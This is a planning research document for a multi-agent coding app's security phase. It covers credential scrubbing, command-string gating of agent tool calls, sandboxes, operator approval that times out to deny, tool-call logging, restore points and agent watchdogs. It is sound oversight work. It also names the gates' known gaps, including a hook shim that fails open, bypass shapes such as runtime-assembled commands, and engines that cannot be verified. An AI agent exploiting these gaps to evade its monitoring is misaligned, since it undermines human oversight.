# Phase 4: Overnight on a Repo That Matters — Research

**Researched:** 2026-08-25
**Worktree:** `E:\munder-difflin\.claude\worktrees\gsd-plan-phase-04` @ `ad3d2f7`
**Domain:** Electron main-process trust boundary, durable telemetry storage, git shadow-repo snapshots, absence detection
**Confidence:** HIGH on source seams and the git/env/engine measurements (all re-run in this session on this machine); MEDIUM on the non-installed engines' veto surfaces; LOW on nothing that is load-bearing.

> **How this was produced, stated plainly.** `04-CONTEXT.md` is already deeply researched against source at `d338b66`. This document does **not** repeat it. It (1) re-verifies every load-bearing citation at `ad3d2f7` and reports drift, (2) fills the gaps a *planner* needs — call chains, sequencing, testability, live-verification odds — and (3) records the places where a live measurement **contradicts** CONTEXT.md. Every claim below cites a file and line opened in this session, or a command run in this session, or is marked `UNVERIFIED`.
>
> **Baseline re-measured in this session** (the CONTEXT's own instruction, D-37): `node --test test/*.test.cjs` → **805 tests / 798 pass / 0 fail / 7 skipped (23.7 s)**. `tsc --noEmit` on `tsconfig.node.json` and `tsconfig.web.json` → **0 errors each**. CONTEXT.md's `d338b66` figure was 800/793/0/7; plan **02-12 has landed** (`8e85748`), so **D-37's block is lifted**.

---

<user_constraints>
## User Constraints (from CONTEXT.md)

### Locked Decisions

Copied from `04-CONTEXT.md` `<decisions>`. All 37 are binding. Reproduced here in the planner's working order; the CONTEXT is the authority on wording.

**Trust boundary (GATE-03 / GATE-05)**
- **D-01:** GATE-03 and GATE-05 are the same seam (`ControlRegistry.toolDecision`, `src/main/control.ts:97`). Slice as one owner or strictly sequence.
- **D-02:** Do not build a new rule engine. Widen `HookServer.protectedPathDenial` (`src/main/hooks.ts:860`) — not `AGENT_DENY_RULES`.
- **D-03:** `AGENT_DENY_RULES` stays as defence in depth; **no success criterion may be marked green on its behaviour.**
- **D-04:** The four command shapes are judged **semantically on tokenized input**, not by prefix. Extend the honest ceiling list (`hooks.ts:800-859`) with this gate's own gaps — at minimum runtime-assembled command strings, `cd`-then-relative invocation, and a harness home containing a space.
- **D-05:** Host allowlist is **deny-by-default with an operator-editable allow set**. An empty or unreadable allowlist **must fail CLOSED and say so loudly**. Not discretionary — decide in writing.

**Engine reach (GATE-03 honesty clause)**
- **D-06:** The four engines do not have four equal paths. Codex and Grok reachable today; pi mechanically buildable (`post()` must become request/response); OpenCode **NOT live-verifiable — mark `LIVE-UNVERIFIED`, do not tick criterion 1's OpenCode clause.** qwen proxy tier out of reach entirely.
- **D-07:** Two pre-existing holes are inherited, not opened, and must be **restated** not silently carried: (1) user-global engine seeds outside the hive root; (2) the shim fails open by design. Neither is in Phase 4's scope to fix.

**The third answer (GATE-05)**
- **D-08:** The bounded wait is **two-phase**. Main answers allow/deny **synchronously and at once**; only on *ask* does main emit a pending reply and only then does the shim enter a second, longer wait that **defaults to DENY on expiry**. A socket that is gone still exits 0 = allow. Reconcile the two deadlines explicitly.
- **D-09:** The operator is asked through the phone surface that **already exists** (`src/main/webhook.ts`). Build no second one. Plus desktop `Notification` and Web Push (`src/main/push.ts`).
- **D-10:** Pending tool approvals are an **in-memory registry merged into `openAsks()`** — they do not become cards. `PhoneAsk` gains a `kind` field; `answerAsk`'s first argument widens from task id to ask id, **back-compatible if the card path keeps emitting the task id as its id.**

**Child env (GATE-02)**
- **D-11:** **Allowlist, not denylist**, at the one `pty.spawn` choke point (`src/main/pty.ts:751`).
- **D-12:** The acceptance test is `env` inside a real agent terminal and it must assert **both directions** — hive vars present *and* operator credentials absent.
- **D-13:** ⚠️ Regression hazard. Ship the allowlist with an operator-visible additive pass-through list and verify at least one live non-Claude agent still authenticates and completes a task.

**Sandbox (GATE-04)**
- **D-14:** The blocker is a path-tree problem; the fix is **writable roots**, not dropping the sandbox. Re-enable `-s workspace-write` and add the agent directory as an additional writable root.
- **D-15:** **Per-engine, opt-in, with a verified fallback. Deliver exactly ONE engine** (codex recommended). "At least one engine" is the requirement; five half-verified ones do not satisfy it.

**The record (RECORD-01 / RECORD-02)**
- **D-16:** Both resolve to one storage decision: **SQLite, in the `PersistStore` that is already open** (`src/main/db.ts`).
- **D-17:** RECORD-01 is a **new writer, not a bigger ring**. Persist every tool call with agent, timestamp, tool and target; **keep the ring** as the hot read path for the waterfall UI.
- **D-18:** RECORD-02 is a **retention decision** — a query bound, not a byte window. Coordinate with `UNTRACK_PATHS`.
- **D-19:** RECORD-02 is SCALE-03's storage; design the table so a day is a **range scan**, and stop at the storage boundary. Phase 4 does not build the replay UI.

**Restore points (RECORD-05)**
- **D-20:** **A separate `GIT_DIR` plus `GIT_INDEX_FILE` over the operator's working tree.** The only candidate satisfying the literal untouched-list.
- **D-21:** `UNTRACK_PATHS` discipline reused literally; the restore store added to it. **Note the `backups` name collision** (`src/main/reflect.ts:263`) — RECORD-05 needs a different directory name.
- **D-22:** Restoring is per-file and must be **proven not to touch neighbours**: snapshot, change two other files, restore one, assert the other two byte-identical **and** `git status --porcelain` / `git rev-parse HEAD` unchanged across the sequence.

**Absence (VIGIL-01)**
- **D-23:** The watchdog is a **new, operator-directed alarm in main**. It is **not** `HEARTBEAT_MISSION` — a beat addressed to the god cannot report that the god died.
- **D-24:** The quiet signal already exists (`PtySession.lastOutputAt`). Do not add a second one. Combine with the ledger's last mutation and the router's last delivery.
- **D-25:** "Told once" is a **latch** that must survive the thing it is watching. It belongs in the floor scheduler seam in **main**, never in a mission dispatched to an agent and never in the renderer. Route through the same three channels as D-09.

**Dead and blocked agents (VIGIL-02 / VIGIL-03)**
- **D-26:** VIGIL-02's insertion point is `teardownPty` (`src/main/floor/lifecycle.ts:222`), immediately after `setArchived`. Reuse `worktreeHasUnintegratedWork`'s result; do not re-shell git.
- **D-27:** "Within a minute" is satisfied **synchronously**, not by a sweep. A periodic reaper is a backstop; the plan must say which one it is testing.
- **D-28:** VIGIL-03 is half-shipped and **the shipped half is unreachable without the other half**. A plan that marks VIGIL-03 green by pointing at `stopArmDecision` has marked an unreachable branch green.
- **D-29:** **Blocked-detection moves to main.** One change closes three problems: off-screen coverage, headless correctness, and main sees every byte first. Carry `BLOCK_HINTS`' known false positive and its recovery path.

**Age (VIGIL-04)**
- **D-30:** `updatedAt` is added to `HiveTask`, ISO-string convention, stamped by `bin/task.cjs {add|patch|claim|done}` — the ledger's only sanctioned writer.
- **D-31:** Correction to the requirement text: `humanQA.askedAt` **is parsed** (`TasksKanban.tsx:15`, `:100`). The gap is rendering only.
- **D-32:** Age is **derived at render, never stored**.

**Phase-wide (binding)**
- **D-33:** Phase 2's D-40 inherited verbatim: **no gate may pass because it parsed nothing.** Assert over joined/parsed text and assert a **positive lower bound** alongside every negative.
- **D-34:** **A security gate's ceiling is part of the deliverable.** GATE-02, GATE-03 and GATE-05 each ship one.
- **D-35:** `use_worktrees: false`. **Give each file exactly one owner per wave.** Named concentration risks: `hooks.ts`, `control.ts`, `floor/lifecycle.ts`, `hive.ts`, `db.ts`, `index.ts`.
- **D-36:** **Do not touch `package.json` or `package-lock.json`.** If a plan believes it needs a dependency, re-read the ladder.
- **D-37:** Phase 4 starts after 02-12 lands. — **SATISFIED at `ad3d2f7`; see Drift Report row 0.**

### Claude's Discretion

Verbatim from `04-CONTEXT.md`:

- Plan slicing and wave assignment across the eleven requirements — subject to D-01, D-35 and D-37.
- The exact SQLite schema for the tool-call record and the event log (D-16/D-18), and whether they are one table with a kind discriminator or two — subject only to D-19's range-scan-by-day requirement.
- Retention policy numbers for RECORD-02 — the decision locked here is "a query bound, not a byte window"; the actual bound is the planner's.
- The default host allowlist membership for D-05 (the fail-closed-when-empty question is **not** discretionary — decide it in writing).
- Snapshot cadence and pruning policy for RECORD-05 restore points, and the directory name that avoids the `backups` collision (D-21).
- Which single engine takes GATE-04's sandbox (codex is recommended and reasoned in D-15, but the planner may substitute one with better live-verification odds on this machine).
- Whether VIGIL-03's main-side parser replaces `usePtyParser` outright or runs alongside it during a transition (D-29).
- The exact ask TTL and the reconciled shim ceiling for D-08 — the two-phase shape is locked, the numbers are not.

### Deferred Ideas (OUT OF SCOPE)

- Closing the user-global engine-seed hole (`~/.codex/config.toml`, `~/.gemini/.../hooks.json`, `~/.grok/hooks/` — D-07 hole 1).
- Making the hook shim fail closed (D-07 hole 2).
- A quote-aware tokenizer for the Bash arm of `protectedPathDenial` — ceiling item (b).
- GATE-03 for the qwen proxy tier — no tool-call boundary in a proxy bridge to gate at.
- Extending the sandbox (GATE-04) to the remaining ten engines.
- SCALE-03's replay UI — Phase 3 owns the surface; Phase 4 owns only the storage it reads.
- Migrating the existing `cost-ledger.jsonl` into SQLite.
- Removing the now-unused `tunnelmole` dependency — blocked by the npm-10 lockfile constraint.
- Restore points for the hive repo itself — RECORD-05 is scoped to the operator's project repo.
- A physical-device pass over the GATE-05 phone approval flow. "Verification needs a real device" is a first-class outcome here, not a failure.
</user_constraints>

---

<phase_requirements>
## Phase Requirements

| ID | Description (REQUIREMENTS.md) | Research support in this document |
|----|-------------------------------|------------------------------------|
| **GATE-02** | `env` inside any agent terminal shows the hive's own variables and not the operator's cloud, git or API credentials | §Pattern 1 (allowlist at `pty.ts:751`); §Landmine L-04 (Crush reads keys from inherited env); §Environment Availability (win32 minimum set, live-probed) |
| **GATE-03** | A tool call is judged in main against the actual command string, on every engine | §Pattern 2 (`commandShapeDenial` beside `protectedPathDenial`); §Cross-Engine Reality (7 hook surfaces, not 4); §Landmine L-01 (`targets.length === 0` early return) |
| **GATE-04** | An agent runs with its engine's own sandbox **on** and still completes hive housekeeping | §GATE-04 measured (codex `--add-dir` flag exists; `codex sandbox windows` exists; upstream bug #23552 OPEN on Windows); §Landmine L-08 (two argv splice sites) |
| **GATE-05** | A third answer between allow and deny, bounded wait timing out to deny | §Pattern 3 (poll-based two-phase, with the reason a held connection breaks grok/agy); §Sequencing S-2 |
| **RECORD-01** | Every agent tool call persisted with agent, timestamp, tool and target | §Pattern 4 — **the writer must hang off the hook socket, not telemetry** (three measured reasons); §Landmine L-05 |
| **RECORD-02** | A day that has already happened is still fully readable | §Pattern 5 (SQLite `events` table, day as range scan); §db.ts migration mechanics |
| **RECORD-05** | One file back to 02:00 without losing three other agents' work | §Pattern 6 — **live-measured on this machine**, including three failure modes CONTEXT.md does not name |
| **VIGIL-01** | Nothing happening is itself an event, including god-death | §Pattern 7 (watchdog in the `floor/boot.ts` scheduler seam + `SHUTDOWN_STEPS` inverse) |
| **VIGIL-02** | A card whose owner died is back on the board within a minute | §Pattern 8 (`teardownPty` after `setArchived`); §Landmine L-09 (`finalizeAgentWorktree` is `void`-fired async) |
| **VIGIL-03** | An agent blocked on a prompt is visibly blocked off-screen and is never idled then mailed | §Pattern 9 — **the main-side durable path has NO guard at all**; this is a stronger finding than D-28 |
| **VIGIL-04** | Every card and unanswered ASK ME renders its age | §Pattern 10 (`updatedAt` on `HiveTask`, stamped in `TASK_CLI`) |
</phase_requirements>

---

## Summary

Phase 4 is three unrelated engineering problems wearing one phase number, and the single most valuable thing research can give the planner is the news that **two of the three have a materially different shape than `04-CONTEXT.md` concluded** — not because the CONTEXT was careless (it is the most rigorous input this project has produced) but because two of its conclusions rest on facts that only a *runtime* measurement can settle, and it was written without running one.

The first correction is **RECORD-01**. D-17 says "persist every tool call at the point the span is recorded." Measured: `ToolSpan` (`src/main/telemetry.ts:97-107`) has **no `target` field**; its only producer is the OTLP `tool_result` log record (`telemetry.ts:535-544`) whose attribute reader is gated by an `ATTR_ALLOWLIST` (`telemetry.ts:676-680`) that contains **no path or command key at all**; and OTel is injected only `if (claudeProvider && this._otelEndpoint)` (`src/main/hive.ts:1122`). So the telemetry path can supply neither the *target* the requirement names nor any engine but Claude. The record has to be written from the **hook socket** — `HookServer.handle`, where `p.tool_name` and `p.tool_input` already arrive (`hooks.ts:86-116`), where `authorized()` has already derived the agent id from a per-agent token (GATE-01), and where every hook-bridged engine already routes. The ring buffer stays exactly as it is.

The second correction is **VIGIL-03**. D-28 calls it "half-shipped, and the shipped half is unreachable." Measured, it is worse and simpler than that: Phase 2 moved the quiesce backstop into main (`src/main/delivery.ts:713-753`), and the main-side loop calls `this.deps.setStatus?.(a.agentId, 'idle')` at **`delivery.ts:740`** with no blocked check whatsoever — it checks the breaker level and the boot grace and nothing else. `stopArmDecision` (`useHive.ts:169`) guards only the *renderer's* reaction to the synthesized Stop that is emitted on the very next line. So the durable half flips a blocked agent to idle unconditionally, and the wake nudge that follows (`delivery.ts:770-806`) filters on `switching`/`paused`/`vetoed`/boot-grace/`idleMs` and **not on status**, so it mails that agent more work. VIGIL-03's fix belongs in `delivery.quiesce`, in main, with `blocked` added to `LiveAgentPty` (`delivery.ts:68-80`). A plan that only fixes detection and leaves `delivery.ts:740` alone ships a green test and an unchanged bug.

The third finding is the one that changes what the phase can *honestly claim*. **Of the four engines criterion 1 names — Codex, Grok, pi, OpenCode — only Codex is installed on this machine**, and it is logged in (`codex login status` → "Logged in using ChatGPT"; `codex-cli 0.128.0`). Grok, pi, OpenCode, Crush, kimi, agy and qwen are all absent. CONTEXT.md's proposed SUMMARY wording ("refused for Codex and Grok (live-verified)") is therefore **not achievable** without installing grok and obtaining an xAI key. Simultaneously, GATE-03's reach is *wider* than D-06 describes: `BridgeDescriptor` (`src/shared/agentProvider.ts:71`) enumerates **six** hook shims — `agy | codex | pi | opencode | grok | kimi` — plus Claude's native `--settings`, so main-side judging covers **seven** engines, and `kimi` and `antigravity` are two the CONTEXT never mentions.

Everything else confirms. `protectedPathDenial` is the right host for GATE-03 and already contains the tokenizer, the expansion, the ceiling-list house style and the operator-legible reason strings. The phone ask surface is finished and needs no new endpoint. And RECORD-05's separate-`GIT_DIR` mechanism was **run end-to-end on this Windows machine in this session** and works — leaving `HEAD`, `status --porcelain`, branches and reflog byte-identical, honouring the operator's own `.gitignore` for free, and deduping snapshots content-addressably — with three concrete failure modes that must be designed for and are documented in §Landmines.

**Primary recommendation:** slice the phase into three independent tracks (GATE, RECORD, VIGIL) that share no file, sequence GATE-03 → GATE-05 as one owner over `hooks.ts`+`control.ts`, hang RECORD-01 off `HookServer.handle` rather than `TelemetryCollector`, and put VIGIL-03's guard in `delivery.quiesce` before touching the renderer at all.

---

## Drift Report

CONTEXT.md's citations were measured at `d338b66` on 2026-08-24. Re-checked at `ad3d2f7` on 2026-08-25. `index.ts` grew 4,967 → **4,980** lines; every other cited file is unchanged in length.

| # | CONTEXT.md citation | Actual at `ad3d2f7` | Verdict |
|---|---------------------|---------------------|---------|
| 0 | D-37: "02-12 in flight; `hiveProvisioning.ts` expects 5 markers, found 4" | `grep -ro 'LIVE-UNVERIFIED' src/` → `hive.ts:3, hiveProvisioning.ts:5, hiveTemplates.ts:3, index.ts:1, webhook.ts:3, agentProvider.ts:3` = **18 total**, matching `MARKER_LEDGER` (`test/repo-claims.test.cjs:1291-1298`) exactly. `node --test test/repo-claims.test.cjs` → 31/31 pass. 02-12 merged at `8e85748`. | **RESOLVED — D-37's block is lifted** |
| 1 | `src/main/control.ts:97` `toolDecision`, synchronous | `control.ts:97` — `toolDecision(id: string, tool: string): { deny: boolean; reason?: string }`. Synchronous. File is 118 lines. | **OK** |
| 2 | `src/main/hooks.ts:860` `protectedPathDenial` | `hooks.ts:860` — `private protectedPathDenial(agentId, p): string \| null`. | **OK** |
| 3 | `hooks.ts:787-800` "why not in AGENT_DENY_RULES" | `hooks.ts:787-799`. Text matches. | **OK** |
| 4 | `hooks.ts:800-859` the ceiling list, items (a)-(i) | `hooks.ts:801-859`, items (a)-(i) present; `hooks.ts:848` carries the "omits (b), (f) or (g)" rule verbatim. | **OK** |
| 5 | `hooks.ts:54-62` the two inherited holes | `hooks.ts:54-62`. Text matches. | **OK** |
| 6 | `hooks.ts:1368-1398` "the PreToolUse branch and the `toolDecision` call"; `code_context` says `hooks.ts:1387` | `protectedPathDenial` called at **`hooks.ts:1369`**; `toolDecision` called at **`hooks.ts:1388`**. The `<code_context>` figure of `:1387` is off by one. | **MOVED (+1)** |
| 7 | `src/main/hiveProvisioning.ts:63` `AGENT_DENY_RULES`; `:461-466` where it is written | `hiveProvisioning.ts:63` `const AGENT_DENY_RULES = [`; `:461` comment, `:466` `permissions: { deny: AGENT_DENY_RULES }`. | **OK** |
| 8 | `src/main/hiveTemplates.ts:298-347` `HOOK_SHIM`; the 5 s fail-open "at `:346`" | `HOOK_SHIM` at `:298`; response read at `:342-345`; `setTimeout(() => process.exit(0), 5000).unref()` at **`:347`**. | **MOVED (+1)** |
| 9 | `hiveTemplates.ts:364` `AGY_HOOK_SHIM` | `:364`. Its own 5 s exit at `:412`. | **OK** |
| 10 | `hiveTemplates.ts:425` `PI_EXTENSION`, `ev.approve()` at `:444-446` | `:425`; the `tool_call` handler with `ev.approve()` at `:443-446`. | **OK** |
| 11 | `hiveTemplates.ts:466` `OPENCODE_PLUGIN` | `:466`. | **OK** |
| 12 | D-06: "Codex and Grok … whose shims reuse `HOOK_SHIM`'s response contract" | **PARTLY WRONG.** Codex reuses `HOOK_SHIM` verbatim (`hiveTemplates.ts:291`, `hiveProvisioning.ts:244`). **Grok has its own translator, `GROK_HOOK_SHIM` at `hiveTemplates.ts:730`**, written at `hiveProvisioning.ts:420`, with its own 5 s exit at `:795` and its own `JSON.parse(resp)` reply decoder at `:772-784`. This matters for GATE-05 — see Landmine L-02. | **CORRECTED** |
| 13 | D-06: four engines | **UNDERCOUNT.** `BridgeDescriptor` (`agentProvider.ts:71`) enumerates six hook shims: `'agy' \| 'codex' \| 'pi' \| 'opencode' \| 'grok' \| 'kimi'`. **`kimi` (`agentProvider.ts:329`, `hookBridge: 'kimi'` at `:351`) and `antigravity`/agy (`:366`, `hookBridge: 'agy'` at `:377`) are also main-judged and are never named in CONTEXT.md.** | **CORRECTED (wider)** |
| 14 | `src/shared/agentProvider.ts:262-272` codex bypass flag + path-tree comment | Comment `:262-270`, `autoModeFlag` `:271`, `autoFlag` `:272`. | **OK** |
| 15 | `agentProvider.ts:500` opencode's `--yolo`; `:684-691` `bridgeOf` | `:499` is **crush**'s `autoModeFlag: '--yolo'`. OpenCode's is `autoModeFlag: ''` at `:428`. `bridgeOf` is at `:688-691`. | **WRONG ENGINE / MOVED** |
| 16 | `src/main/hive.ts:999` per-agent `CODEX_HOME` | `:999` is the explanatory comment; the assignment `env.CODEX_HOME = installCodexHooks(...)` is at **`hive.ts:1017`**. | **MOVED (+18)** |
| 17 | `src/main/pty.ts:751` the `process.env` spawn spread | `pty.ts:745` `const proc = pty.spawn(...)`; `pty.ts:751` `...process.env,`. Exact. | **OK** |
| 18 | `pty.ts:826` `proc.onData` | `:826`. `lastOutputAt` bumped at `:831`. | **OK** |
| 19 | `pty.ts:54-58` / `:58` `lastOutputAt` | Doc comment `:54-58`; the field declaration is at **`:59`**. Also present and unnamed by CONTEXT: `lastOutputAt(id)` at `:936` and **`idleFor(id)` at `:940-945`**, plus `outputTail(id)` at `:930` over a 256 KiB main-side ring (`TAIL_CAP_BYTES`, `:77`). | **MOVED (+1); three unnamed assets found** |
| 20 | `src/main/shellEnv.ts` 112 lines | 112 lines. | **OK** |
| 21 | `src/main/webhook.ts:111` `PhoneAsk`; `:149-152` `openAsks`/`answerAsk`; `:634` GET; `:644-676` POST | `:111` `export interface PhoneAsk`; `:149` `openAsks?`; `:152` `answerAsk?`; `:633-639` the GET handler doc+body; `:643-676` the POST. | **OK** |
| 22 | `src/main/index.ts:1221-1236` `openPhoneAsks` | `:1221-1236`. Emits `askedAt` and sorts newest-first, as stated. | **OK** |
| 23 | `index.ts:1321-1322` the wiring | `:1321` `openAsks: () => openPhoneAsks(),`. | **OK** |
| 24 | `index.ts:4768` desktop `Notification` | The `Notification.isSupported() && new Notification(...)` call is at **`index.ts:4781`**; a second one at `:4159`. | **MOVED (+13)** |
| 25 | `src/main/push.ts` 293 lines | 293 lines. | **OK** |
| 26 | `src/main/telemetry.ts:161` `SPAN_RING_CAP = 200`; `:96` "never persisted" | `:161` and `:95-96`. | **OK** |
| 27 | `src/main/db.ts:64-77` schema + `(agent_id, ts DESC)` index | `:64-77` — `MIGRATIONS` opens at `:63`; the migration-1 `db.exec` runs `:66-78`; `idx_ch_agent_ts ON command_history(agent_id, ts DESC)` at **`:77`**. | **OK** |
| 28 | `<code_context>`: "`control.ts`, `delivery.ts`, `webhook.ts`, `hooks.ts`, `push.ts` and `db.ts` all avoid electron imports" | **FALSE for `db.ts` and `hooks.ts`.** `db.ts:19` is `import { app } from 'electron'`. `hooks.ts` imports `WebContents` and `Notification` from electron (see `test/boot-floor.test.cjs:52`, which stubs `Notification` specifically *because* `hooks.ts` imports it as a value). Both are testable only through `test/load-ts.cjs`'s stub or an injected `require.cache` entry. | **CORRECTED** |
| 29 | `src/main/hive.ts:323` `LOG_ROTATE_BYTES`; `:2488-2509` the rotate; `:2512-2516` the migration note | `:323`; `appendLog` at `:2485`, rotate branch `:2494-2504`; the cost-ledger/SQLite note at `:2512-2516`. | **OK** |
| 30 | `src/main/gitCommitter.ts:82` `UNTRACK_PATHS`; `:161-163` enforcement | `:82` `['cost-ledger.jsonl','log.jsonl','log.jsonl.1','backups']`; `ls-files` at `:161`, `rm --cached` at `:163`. | **OK** |
| 31 | `src/main/hive.ts:788` the ignore seed | The `want` array is `hive.ts:782-792`; `'backups/'` is at `:787`. `:788` is the `*.tmp-*` comment. | **MOVED (array spans 782-792)** |
| 32 | `src/main/reflect.ts:263` backups path; `:549` `pruneBackups` | `:263` `join(home,'hive','backups',stamp,id,'memory.md')`; `pruneBackups` doc `:549`, function `:552`; `KEEP_BACKUPS` at `:47`. | **OK** |
| 33 | `src/main/git.ts:334` `worktreeHasUnintegratedWork`; `:518` `listWorktrees` | `:334` and `:518`. | **OK** |
| 34 | `src/main/config.ts:85-108` `HEARTBEAT_MISSION` | Doc `:85-94`, const `:95`, `enabled: false` `:104`, `quietThresholdMs: 300_000` `:106`, `to: 'god'` `:98`. | **OK** |
| 35 | `src/main/floor/lifecycle.ts:222-254` `teardownPty`; `:180-213` `finalizeAgentWorktree` | `teardownPty` `:222-252`; `setArchived` `:232`; `finalizeAgentWorktree` **`:196-214`** (CONTEXT said `:180-213`), `worktreeHasUnintegratedWork` call at `:200`. | **MOVED (function starts at :196)** |
| 36 | `src/renderer/src/hooks/useHive.ts:122-172` `stopArmDecision`; `:140-144` the false positive | `stopArmDecision` declared `:156`, the guard at `:169`; rationale block `:122-155`. `<code_context>` also says `:158` — the `export function` line is `:156`. | **MOVED (-2)** |
| 37 | `usePtyParser.ts:31` and `:158` `BLOCK_HINTS` | `:31` declaration, `:158` `BLOCK_HINTS.some(re => re.test(recent))`. | **OK** |
| 38 | `terminalPool.ts:59` single `onData` slot; `:171` buffer fills unmounted; `:412` polling precedent | `:59` `onData?: (chunk: string) => void;`; `:171` the comment; `:412` the polling doc, `setInterval(read, 1000)` at `:422`. | **OK** |
| 39 | `TasksKanban.tsx:15` and `:100` `askedAt` parsed | `:15` `askedAt?: string;`, `:100` the parse. D-31 confirmed. | **OK** |
| 40 | `src/main/delivery.ts` quiesce, `QUIESCE_IDLE_MS` | `QUIESCE_IDLE_MS = 12_000` at `:187`; `private quiesce(...)` at `:713`; the unguarded `setStatus(...,'idle')` at **`:740`**; the synthesized emit at `:752`. | **OK, and see §Pattern 9** |
| 41 | `src/main/procKill.ts:34` `hardKillTree` | `:34`. File is 54 lines. | **OK** |
| 42 | `src/main/floor/boot.ts` + `SHUTDOWN_STEPS` | `boot.ts` 1,220 lines; `Floor` interface `:97-146`; module-state `let` block `:150-180`; `persist = new PersistStore()` at **`:1148`**; `persist.open()` at `:1155`. | **OK** |

---

## Architectural Responsibility Map

| Capability | Primary tier | Secondary tier | Rationale |
|---|---|---|---|
| Env scrubbing (GATE-02) | **Main — `PtyManager.spawn`** | — | One choke point already (`pty.ts:745-751`); the child never sees what main does not hand it |
| Command-string judging (GATE-03) | **Main — `HookServer.handle`** | — | Every hook-bridged engine posts here; the shim only relays (`hooks.ts:629-631`) |
| Host allowlist (GATE-03) | **Main — pure module** | Config (`config.ts`) for the operator-editable set | Electron-free pure function is testable on three CI platforms |
| Approval registry + TTL (GATE-05) | **Main — new module beside `control.ts`** | Shim (a poll loop) | The wait must outlive nothing and must not be a second PTY typer (ADR-0001) |
| Asking the operator (GATE-05) | **Main — `openAsks()` merge** | Transport: `webhook.ts` (phone), `index.ts:4781` (desktop), `push.ts` (pocket) | Trust boundary finished in Phase 2; publishing into it adds no boundary |
| Sandbox flags (GATE-04) | **Shared — `agentProvider.ts` preset** | Main `config.ts:1067` **and** renderer `store/config.ts:430` (both splice) | The flag is part of the command string, assembled in two places |
| Tool-call record (RECORD-01) | **Main — `HookServer.handle` → `PersistStore`** | Ring buffer stays in `telemetry.ts` for the waterfall | The hook payload is the only place agent+tool+**target** exist for every engine |
| Event log (RECORD-02) | **Main — `hive.appendLog` → `PersistStore`** | `log.jsonl` append retained as the crash-safe belt | A day must be a range scan (D-19), which a byte window cannot be |
| Restore points (RECORD-05) | **Main — scheduler seam, shelling `git`** | — | Content-addressed dedup; runs against the operator's work-tree, never their `.git` |
| Absence watchdog (VIGIL-01) | **Main — `floor/boot.ts` scheduler + `SHUTDOWN_STEPS`** | Three alarm channels as above | Must outlive the god and survive no-window (`floor/headless.ts`) |
| Card release (VIGIL-02) | **Main — `floor/lifecycle.ts:222`** | Ledger write through `bin/task.cjs` | `teardownPty` runs on node-pty `onExit`; same tick = well inside a minute |
| Blocked detection (VIGIL-03) | **Main — `pty.ts:826` tap → `delivery.quiesce` guard** | Renderer renders a state main owns | Headless floor has no renderer parser at all |
| Card age (VIGIL-04) | **Renderer — derived at render** | Main stamps `updatedAt` in `TASK_CLI` | A stored age is wrong the moment nothing rewrites it (D-32) |

---

## Standard Stack

**No new dependencies. D-36 is absolute and this phase does not strain it.** Every mechanism below is already installed or is a Node builtin.

### Core

| Library | Version (verified this session) | Purpose | Why standard here |
|---|---|---|---|
| `better-sqlite3` | **13.0.3** (SQLite **3.53.4**) — loaded and queried in this session | RECORD-01 / RECORD-02 storage | Already open in main (`floor/boot.ts:1148`), already WAL, already migration-versioned (`db.ts:148-158`) |
| `node:child_process` (`spawn`) | Node **22** in CI (`ci.yml:15`), **24.13.0** locally | RECORD-05 shells `git` | `src/main/git.ts:10` already does exactly this |
| `git` | **2.52.0.windows.1** on this machine | RECORD-05 shadow repo | Boring, content-addressed, and measured working — see §Pattern 6 |
| `node:net` | builtin | GATE-05 shim poll | `hooks.ts:66` already imports `createServer`; the shims already `net.createConnection` |
| `node:crypto` | builtin | Ask ids | `push.ts` already does dependency-free VAPID from it |

### Supporting (already in the tree — reuse, do not rebuild)

| Asset | Location | Use |
|---|---|---|
| `protectedPathDenial` tokenizer | `hooks.ts:885-889` — `expandHiveVars(...)` then `.split(/[\s;&|<>()"']+/)` | GATE-03 judges the **same** token array; costs nothing extra |
| `boundDeny(reason)` | `hooks.ts:468-474` | The exact wire shape a deny must take; already used for two framing bounds |
| `emitControl` → `control:approvalRequest` | `hooks.ts:1521-1523` | GATE-05's renderer channel **already exists and is already named for this** |
| `PhoneAsk` + `openAsks`/`answerAsk` | `webhook.ts:111`, `:149-152`, `:633`, `:643` | GATE-05's operator surface, finished and tested |
| `PersistStore` | `db.ts:109-273`; migrations array `db.ts:63-107` | RECORD-01/02; append migration index **2** → `user_version 3` |
| `PtySession.tail` + `outputTail(id)` | `pty.ts:64-77`, `:930-933`; 256 KiB cap at `:77` | **VIGIL-03's main-side buffer already exists** and fills whether or not a renderer is attached |
| `PtyManager.idleFor(id)` | `pty.ts:940-945` | VIGIL-01's per-PTY silence, already computed |
| `worktreeHasUnintegratedWork` | `git.ts:334`, called `lifecycle.ts:200` | VIGIL-02's "where their branch is" |
| `SHUTDOWN_STEPS` / `Floor.shutdown` | `floor/boot.ts:97-146` | VIGIL-01's timer must be registered in the one teardown list (#34) |
| `gitCommitter`'s stale-lock recovery | `gitCommitter.ts:76-79` (`STALE_LOCK_MS = 60_000`), debounce + `committing` flag `:168-171` | RECORD-05's own `index.lock` serialization — copy the pattern (§Landmine L-07) |

### Alternatives considered

| Instead of | Could use | Tradeoff |
|---|---|---|
| SQLite for RECORD-01/02 | A third JSONL with its own retention | Rejected by D-16 and by the ladder — a second retention policy next to an open, indexed DB |
| Poll-based GATE-05 wait | Held-open socket + `async handle` | **Rejected on measurement** — breaks grok/agy reply decoders (L-02) and forces a 30-return-point function async |
| Shadow `GIT_DIR` for RECORD-05 | `git stash` / shadow branch / file copies | Scored and rejected in D-20's table; the measurement in §Pattern 6 confirms the winner |
| Main-side `BLOCK_HINTS` on `proc.onData` | Poll `outputTail()` from a timer | Both viable; `terminalPool.ts:412-422` is the house precedent for polling an unsubscribed buffer |

**Installation:** none. `npm install` is not run by this phase.

---

## Package Legitimacy Audit

**Not applicable — this phase installs zero external packages.** D-36 forbids touching `package.json`/`package-lock.json`, and every mechanism researched above resolves to a Node builtin, to `git`, or to `better-sqlite3` **13.0.3**, which is already in `dependencies` and which was loaded and queried in this session (`SQLite 3.53.4`).

| Package | Registry | Disposition |
|---|---|---|
| *(none)* | — | No install step exists in this phase |

**Packages removed due to slopcheck `[SLOP]`:** none — none proposed.
**Packages flagged `[SUS]`:** none — none proposed.

> If any plan in this phase reaches for `npm install`, that is the D-36 signal to re-read the ladder, not a reason to run this audit.

---

## Cross-Engine Reality (GATE-03's honesty clause, re-measured)

This table is the single thing a GATE-03 SUMMARY must not over-claim against. **"Installed here"** was probed in this session by `command -v <cli>; <cli> --version`.

| Engine | `bridgeOf` | Where the shim/plugin lives | Can it honour a deny **today**? | Installed here | Live-verifiable this phase? |
|---|---|---|---|---|---|
